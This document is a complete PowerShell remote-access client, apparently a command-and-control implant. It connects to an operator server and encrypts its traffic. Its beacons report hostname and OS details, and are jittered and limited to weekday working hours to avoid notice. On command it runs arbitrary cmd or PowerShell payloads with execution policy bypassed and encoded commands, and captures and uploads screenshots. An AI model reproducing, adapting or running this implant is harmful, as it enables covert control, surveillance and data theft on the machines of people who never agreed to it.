# Made for Powershell 5.1.22621.4111

# Globals
$global:CVER = "0.2.0"
$global:TYPE = "ps"
$global:client = $null
$global:beaconIntervalInstance = $null
$global:logStream = $null
$global:startTime = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
$global:exitProcess = $false
$global:sentFirstBeacon = $false
$global:sessionId = $null
$global:logEnabled = $true
$global:chunkSize = 1024
$global:address = '127.0.0.1'
$global:port = 54678
$global:maxRetries = 5
$global:retryMode = $false;
$global:retryIntervals = @(
    [uint32]10000,
    [uint32]30000,
    [uint32](1 * 60 * 1000),
    [uint32](2 * 60 * 1000),
    [uint32](4 * 60 * 1000),
    [uint32](6 * 60 * 1000)
)
$global:BEACON_MIN_INTERVAL = 5 * 60 * 1000
$global:BEACON_MAX_INTERVAL = 45 * 60 * 1000

function Write-Log {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$message
    )
    if ($global:logEnabled -and $global:logStream) {
        try {
            $timestamp = (Get-Date).ToUniversalTime().ToString("o")
            $global:logStream.WriteLine("[$timestamp] $message") | Out-Null
            $global:logStream.Flush()
        }
        catch {
            Write-Error "Failed to write to log: $($_.Exception.Message)"
            $global:logEnabled = $false
        }
    }
}

function Get-SessionId {
    try {
        if (-not $global:client -or -not $global:client.Client -or -not $global:client.Client.LocalEndPoint) {
            throw [Exception]::new("Client is not properly initialized.")
        }
        $ipAddress = $global:client.Client.LocalEndPoint.Address.ToString()
        if ($ipAddress -eq "::1") {
            $ipAddress = "127.0.0.1"
        }
        Write-Log "IP Address: $ipAddress"
        $sumIp = 0
        $ipAddress.Split(".") | ForEach-Object {
            $sumIp += [int]$_
        }
        $hashObject = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes("$ipAddress<>$sumIp"))
        $crypt = [BitConverter]::ToString($hashObject).Replace("-", "").Substring(0, 32).ToLower()
        $global:sessionId = $crypt
    } 
    catch {
        Write-Log "Error setting Session ID: $($_.Exception.Message)"
    }
    finally {
        Write-Log "Session ID: $global:sessionId"
    }
}

function Protect-Data {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$data,
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$sharedKey
    )
    try {
        $salt = [byte[]]::new(32)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($salt)

        $iv = [byte[]]::new(16)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)

        $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
            $sharedKey, 
            $salt, 
            200000, 
            [System.Security.Cryptography.HashAlgorithmName]::SHA512
        ).GetBytes(32)

        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

        $encryptor = $aes.CreateEncryptor()
        $dataBytes = [Text.Encoding]::UTF8.GetBytes($data)
        $encryptedData = $encryptor.TransformFinalBlock($dataBytes, 0, $dataBytes.Length)

        $hmac = [System.Security.Cryptography.HMACSHA256]::new($key)
        $authTag = $hmac.ComputeHash($iv + $encryptedData)

        $saltBase64 = [Convert]::ToBase64String($salt)
        $ivBase64 = [Convert]::ToBase64String($iv)
        $authTagBase64 = [Convert]::ToBase64String($authTag)
        $encryptedDataBase64 = [Convert]::ToBase64String($encryptedData)

        return "${saltBase64}:${ivBase64}:${authTagBase64}:${encryptedDataBase64}"
    }
    catch {
        Write-Log "Error in Protect-Data: $($_.Exception.Message)"
    }
}

function Unprotect-Data {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$encrypted,
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$sharedKey
    )
    try {
        $parts = $encrypted -split ':'
        if ($parts.Length -ne 4) {
            throw "Invalid encrypted data format."
        }
        
        $salt = [Convert]::FromBase64String($parts[0])
        $iv = [Convert]::FromBase64String($parts[1])
        $encryptedData = [Convert]::FromBase64String($parts[3])
        
        $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
            $sharedKey, 
            $salt, 
            200000, 
            [System.Security.Cryptography.HashAlgorithmName]::SHA512
        ).GetBytes(32)
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $decryptor = $aes.CreateDecryptor()
        $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
        
        return [Text.Encoding]::UTF8.GetString($decryptedData)
    }
    catch {
        Write-Log "Error in Unprotect-Data: $($_.Exception.Message)"
    }
}

function Get-RetryInterval {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [int]$retries
    )
    if ($retries -lt $global:retryIntervals.Length) {
        return $global:retryIntervals[$retries-1]
    }
    return 0
}

function Send-Command {
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        $response
    )
    try {
        if ($global:client.Connected) {
            # Encrypt the payload
            $encrypted = Protect-Data -data ($response | ConvertTo-Json -Depth 4) -sharedKey $global:sessionId
            if ($encrypted) {
                $tcpStream = $global:client.GetStream()
                $writer = [System.IO.StreamWriter]::new($tcpStream)
                $writer.AutoFlush = $true
                try {
                    if ($encrypted.Length -ge $global:chunkSize) {
                        while ($encrypted.Length -gt 0) {
                            $chunk = $encrypted.Substring(0, [Math]::Min($global:chunkSize, $encrypted.Length))
                            $encrypted = $encrypted.Substring($chunk.Length)
                            if ($encrypted.Length -eq 0) {
                                $chunk += '--FIN--'
                            }
                            Write-Log "Sent Chunk: $chunk"
                            $writer.Write([System.Text.Encoding]::UTF8.GetBytes($chunk), 0, $chunk.Length)
                        }
                    } else {
                        Write-Log "Sent Data: $encrypted"
                        $writer.Write([System.Text.Encoding]::UTF8.GetBytes($encrypted), 0, $encrypted.Length)
                    }
                }
                finally {
                    $writer.Close()
                    $writer.Dispose()
                }
            }
        }
    }
    catch {
        Write-Log "Exception on Send-Command: $($_.Exception.Message)"
    }
}

function Send-Beacon {
    $response = @{
        response = @{
            beacon = $true
            version = $global:CVER
            type = $global:TYPE
            platform = [System.Environment]::OSVersion.Platform.ToString()
            arch = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
            osver = [System.Environment]::OSVersion.VersionString
            hostname = [System.Environment]::MachineName
        }
    }
    Send-Command -response $response
}

function Sleep-For {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [int]$milliseconds
    )
    [System.Threading.Thread]::Sleep($milliseconds)
}

function New-FileName {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$name,
        
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$extension
    )
    $now = Get-Date
    return "$name`_$($now.ToString('yyyy-MM-dd_HH-mm-ss')).$($extension -replace '\.', '')"
}

function Invoke-WebcamClip {
    Send-Command @{
        response = @{
            error = "Currently not supported in this client type."
        }
    }
}

function Invoke-Screenshot {
    try {
        
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Width  = $Screen.Width
        $Height = $Screen.Height
        $Left   = $Screen.Left
        $Top    = $Screen.Top
        
        $bitmap  = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)    

        $fileName = New-FileName -name 'ss' -extension 'jpg'
        $bitmap.Save("$env:TEMP\\$fileName", [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $bitmap.Dispose()
        $graphic.Dispose()

        [byte[]]$image = Get-Content -Path "$env:TEMP\\$fileName" -Encoding "Byte" -Raw

        Send-Command @{
            response = @{
                download = $fileName
                data = [Convert]::ToBase64String($image)
            }
        }

        Remove-Item -Path "$env:TEMP\\$fileName" -Force | Out-Null
    }
    catch {
        Send-Command @{
            response = @{
                error = "Failed to capture screenshot: $($_.Exception.Message)"
            }
        }
    }
}

function Invoke-RemoteCommand {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [string]$command,
        [string]$payload,
        [switch]$isFile = $false
    )
    Begin {
        $command = $command.Trim()
        if ([string]::IsNullOrWhiteSpace($command)) {
            throw "No command provided."
        }
        if ($command -notin @('cmd', 'ps')) {
            throw "Unsupported command."
        }
    }
    Process {
        $processArgs = @{
            FilePath = if ($command -eq "cmd") { "cmd.exe" } else { "powershell.exe" }
            ArgumentList = @()
            NoNewWindow = $true
            Wait = $true
            RedirectStandardOutput = "out.txt"
            RedirectStandardError = "err.txt"
        }
        if ($command -eq "cmd") {
            if ($payload -match '[;&|]') {
                throw "Invalid characters in payload."
            }
            $processArgs.ArgumentList += @('/c', $payload)
        }
        else {
            $processArgs.ArgumentList += @(
                '-NonInteractive',
                '-NoLogo',
                '-NoProfile',
                '-ExecutionPolicy', 'Bypass'
            )
            if ($isFile) {
                $processArgs.ArgumentList += @('-File', $payload)
            }
            else {
                $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
                $processArgs.ArgumentList += @('-EncodedCommand', $encodedCmd)
            }
        }
        $process = Start-Process @processArgs -PassThru
        $process | Wait-Process
        $output = Get-Content -Path "out.txt" -Raw
        $errorOutput = Get-Content -Path "err.txt" -Raw
        
        if ($process.ExitCode -ne 0) {
            Write-Log "Command failed with code $($process.ExitCode). Error output: $errorOutput"
        }
        
        return $output.Trim()
    }
    End {
        Remove-Item -Path "out.txt", "err.txt" -ErrorAction SilentlyContinue
    }
}

function Format-Time {
    [OutputType([string])]
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [int]$milliseconds
    )
    $totalSeconds = [Math]::Floor($milliseconds / 1000)
    $days = [Math]::Floor($totalSeconds / 86400)
    $hours = [Math]::Floor(($totalSeconds % 86400) / 3600)
    $minutes = [Math]::Floor(($totalSeconds % 3600) / 60)
    $seconds = $totalSeconds % 60
    return "$days`d $hours`h $minutes`m $seconds`s"
}

function Get-Uptime {
    $currentTime = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
    $uptimeMillis = $currentTime - $global:startTime
    $uptime = Format-Time -milliseconds $uptimeMillis
    Send-Command @{ response = @{ data = $uptime } }
}

function Close-LogStream {
    if ($global:logStream) {
        try {
            $global:logStream.Close()
            $global:logStream.Dispose()
            $global:logStream = $null
        }
        catch {
            Write-Log "Error closing log stream: $($_.Exception.Message)"
        }
    }
}

function Read-Action {
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$action
    )
    try {
        $parts = $action.Trim() -split '\s+(?=(?:[^"]*"[^"]*")*[^"]*$)'
        $command = $parts[0].ToLower()
        $properties = $parts[1..$parts.Length]
        
        Write-Log "Received command: $command with properties: $($properties -join ' ')"

        switch ($command) {
            { $_ -in 'ps', 'cmd' } {
                if ($properties.Count -eq 0) {
                    throw "No payload provided for $command command."
                }
                $payload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($properties[0]))
                $result = Invoke-RemoteCommand -command $command -payload $payload
                Send-Command @{ response = @{ data = $result } }
            }
            'up' {
                Get-Uptime
            }
            'di' {
                Write-Log "Disconnect command received. Initiating shutdown..."
                $global:exitProcess = $true
                exit
            }
            'ss' {
                Write-Log "Screenshot command received."
                Invoke-Screenshot
            }
            'wc' {
                Write-Log "Webcam capture command received."
                Invoke-WebcamClip
            }
            default {
                throw "Unknown command: $command"
            }
        }
    }
    catch {
        $errorMessage = "Error in Read-Action: $($_.Exception.Message)"
        Write-Log $errorMessage
        Send-Command @{ response = @{ error = $errorMessage } }
    }
}

function Connect-ToServer {
    $connectionRetries = 0

    while (-not $global:exitProcess) {
        try {
            if ($global:client -ne $null -and $global:client.Connected) {
                # Connection is already open, continue using it
                $tcpStream = $global:client.GetStream()

                # Check if we need to send a beacon or handle data
                if (-not $global:sentFirstBeacon) {
                    Send-Beacon
                    $global:sentFirstBeacon = $true
                }

                # Handle incoming data
                $buffer = New-Object byte[] $global:chunkSize
                while ($global:client.Connected -and $tcpStream.DataAvailable) {
                    $bytesRead = $tcpStream.Read($buffer, 0, $buffer.Length)
                    if ($bytesRead -eq 0) { break }
                    $data = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
                    Write-Log "Received Data: $data"
                    $action = Unprotect-Data -encrypted $data -sharedKey $global:sessionId
                    if ($action) {
                        Read-Action -action $action
                    }
                }
            } else {

                if ($global:client -ne $null) {
                    $global:client.Close()
                    $global:client.Dispose()
                    $global:client = $null
                }

                # No connection or connection is not valid; create a new one
                Write-Log "Attempting to connect..."
                $global:client = New-Object System.Net.Sockets.TcpClient($global:address, $global:port)
                if ($global:client.Connected) {
                    Write-Log "Client $global:CVER connected."
                    Get-SessionId
                }
            }
        }
        catch [System.Net.Sockets.SocketException] {
            Write-Log "SocketException occurred: $($_.Exception.Message)"
            $global:retryMode = $true
        }
        catch {
            Write-Log "Exception occurred: $($_.Exception.Message)"
        }
        finally {
            if ($global:retryMode -and $global:client -ne $null) {
                Write-Log "Connection to server closing. Retrying..."

                # Clean up client connection
                $global:client.Close()
                $global:client.Dispose()
                $global:client = $null

                $connectionRetries++
                if ($connectionRetries -gt $global:maxRetries) {
                    Write-Log "Max retries reached. Exiting."
                    $global:exitProcess = $true
                    $global:retryMode = $false
                } else {
                    $retryInterval = Get-RetryInterval -retries $connectionRetries
                    Write-Log "Attempting to reconnect in $($retryInterval / 1000) seconds..."
                    Sleep-For -Milliseconds $retryInterval
                }
            }
        }
    }
}

try {
    # Create a writable stream for logging
    if ($global:logEnabled) {
        $logPath = "$PSScriptRoot\logs\client.log"
        $logDir = [System.IO.Path]::GetDirectoryName($logPath)
        if (-not $logDir -or -not (Test-Path -Path $logDir)) {
            New-Item -ItemType Directory -Path $logDir -Force | Out-Null
        }
        $global:logStream = [System.IO.StreamWriter]::new($logPath, $true)
    }

    # Create beacon interval
    if ($global:beaconIntervalInstance -eq $null) {
        $beaconInterval = Get-Random -Minimum $global:BEACON_MIN_INTERVAL -Maximum $global:BEACON_MAX_INTERVAL
        $global:beaconIntervalInstance = New-Object System.Timers.Timer($beaconInterval)
        $global:beaconIntervalInstance.AutoReset = $true
        $global:beaconIntervalInstance.Enabled = $true
    }

    # Handle sending periodic beacon
    $beacon = Register-ObjectEvent -InputObject $global:beaconIntervalInstance -EventName Elapsed -SourceIdentifier Clock -Action {
        $now = Get-Date
        if ($now.DayOfWeek -in 1..5 -and $now.Hour -in 7..19) {
            Send-Beacon
        }
    }

    # Handle SIGINT (Ctrl+C)
    $ctrlc = Register-ObjectEvent -InputObject ([Console]) -EventName CancelKeyPress -SourceIdentifier CtrlC -Action {
        Write-Warning 'Received SIGINT (Ctrl+C), shutting down gracefully'
        $global:exitProcess = $true
    }

    # Connect
    Connect-ToServer
}
catch {
    Write-Error "Client exception: $($_.Exception.Message)"
}
finally {
    # Close log stream
    Close-LogStream

    if ($global:beaconIntervalInstance) {
        $global:beaconIntervalInstance.Dispose()
    }

    # Unregister events
    Unregister-Event -SourceIdentifier Clock
    Unregister-Event -SourceIdentifier CtrlC

    # Dispose client if it's still connected
    if ($global:client -ne $null -and $global:client.Connected) {
        $global:client.Close()
        $global:client.Dispose()
    }
}
